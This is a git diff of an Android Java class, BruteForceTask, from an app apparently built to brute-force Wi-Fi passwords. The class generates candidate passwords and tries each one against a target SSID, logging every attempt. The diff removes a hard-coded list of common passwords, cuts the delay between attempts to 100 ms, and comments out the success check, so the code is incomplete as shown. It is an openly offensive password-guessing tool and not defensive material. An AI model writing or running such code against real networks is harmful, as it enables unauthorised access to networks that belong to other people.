@@ -2,6 +2,9 @@ package com.nguyen.wifibruteforce;
 
 import android.app.Activity;
 import android.app.ProgressDialog;
+import android.content.Context;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
@@ -9,89 +12,69 @@ import android.util.Log;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import java.util.ArrayList;
+
 import static android.content.Context.WIFI_SERVICE;
 
 public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
-    Activity activity;
-    //    ProgressDialog progressDialog;
-    String foundPass;
+    private Activity activity;
+    private String foundPass;
+    private ArrayList<String> arrPass;
+
+    public ArrayList<String> getArrPass() {
+        return arrPass;
+    }
+
+    public void setArrPass(ArrayList<String> arrPass) {
+        this.arrPass = arrPass;
+    }
 
     public BruteForceTask(Activity activity) {
         this.activity = activity;
-//        progressDialog = new ProgressDialog(activity);
-//        progressDialog.setIndeterminate(false);
-//        // Progress dialog horizontal style
-//        progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
-//        // Progress dialog message
-//        progressDialog.setMessage("Please wait ...");
 
     }
-
 
     @Override
     protected void onPreExecute() {
         super.onPreExecute();
-//        progressDialog.show();
     }
 
     @Override
     protected Integer doInBackground(String... strings) {
-//        String[] test = {"88888888", "123456789", "222222", "444444444", "12345679", "deophaihoi", "thecoffeehouse"};
-//        String testPass;
-//        for (int i = 0; i < test.length; i++) {
-//            testPass = test[i];
-//            Utils.finallyConnect(testPass, strings[0], activity);
-//            Log.d("running", testPass);
-//            publishProgress(i);
-//
-//            if (isCancelled()) {
-//                Log.d("running", "isCancelled");
-//                break;
-//            }
-//            try {
-//                Thread.sleep(9000);
-//            } catch (InterruptedException e) {
-//                e.printStackTrace();
-//            }
-//
-//            WifiManager wifi = (WifiManager) activity.getApplicationContext().getSystemService(WIFI_SERVICE);
-//            WifiInfo wifiInfo = wifi.getConnectionInfo();
-//            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
-//                    && Utils.convertSSID(wifiInfo.getSSID()).equals(strings[0])) {
-//                Log.d("running", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + " /pass: " + testPass);
-//                Log.d("running", "pass is: " + testPass);
-//                foundPass = testPass;
-//                break;
-//            }
-//        }
 
         FindPassword bruteforce = new FindPassword();
+        arrPass = bruteforce.arrBFTemp;
         int count = 1;
         for (int length = bruteforce.min; length < bruteforce.max; length++) { // Change bruteforce.min and bruteforce.max for number of characters to bruteforce.
-            bruteforce.generate("", 0, length); //prepend_string, pos, length
-            publishProgress(count);
-            count+=1;
+            //bruteforce.generate("", 0, length); //prepend_string, pos, length
+            bruteforce.generate("acbb", 0, length); //prepend_string, pos, length
+        }
+        for (String testPass : arrPass) {
+            Utils.finallyConnect(testPass, strings[0], activity);
+            Log.d("running", testPass);
 
-            Utils.finallyConnect(bruteforce.getPass(), strings[0], activity);
-            Log.d("running", bruteforce.getPass());
+            publishProgress(count);
+
             if (isCancelled()) {
-                Log.d("running", "isCancelled");
+                Log.d("running", "isCancelled_BF");
                 break;
             }
             try {
-                Thread.sleep(9000);
+                Thread.sleep(100);
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
-            WifiManager wifi = (WifiManager) activity.getApplicationContext().getSystemService(WIFI_SERVICE);
-            WifiInfo wifiInfo = wifi.getConnectionInfo();
-            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
-                    && Utils.convertSSID(wifiInfo.getSSID()).equals(strings[0])) {
-                Log.d("running", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + " /pass: " + bruteforce.getPass());
-                Log.d("running", "pass is: " + bruteforce.getPass());
-                foundPass = bruteforce.getPass();
-                break;
-            }
+//            ConnectivityManager cm = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
+//            assert cm != null;
+//            NetworkInfo ni = cm.getActiveNetworkInfo();
+//            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
+//                    && Utils.convertSSID(ni.getExtraInfo()).equals(strings[0])) {
+//                Log.d("running", Utils.convertSSID(ni.getExtraInfo()) + "/" + strings[0] + "/pass: " + testPass);
+//                foundPass = testPass;
+////                Log.d("running", "pass for Toast: " + foundPass);
+//                break;
+//            }
+            count += 1;
         }
         return null;
     }
@@ -109,6 +92,7 @@ public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
     protected void onPostExecute(Integer integer) {
         super.onPostExecute(integer);
 //        progressDialog.dismiss();
+        Log.d("running", "out");
         Toast.makeText(activity.getApplicationContext(), R.string.pass_found + foundPass, Toast.LENGTH_LONG).show();
         activity.finish();
     }
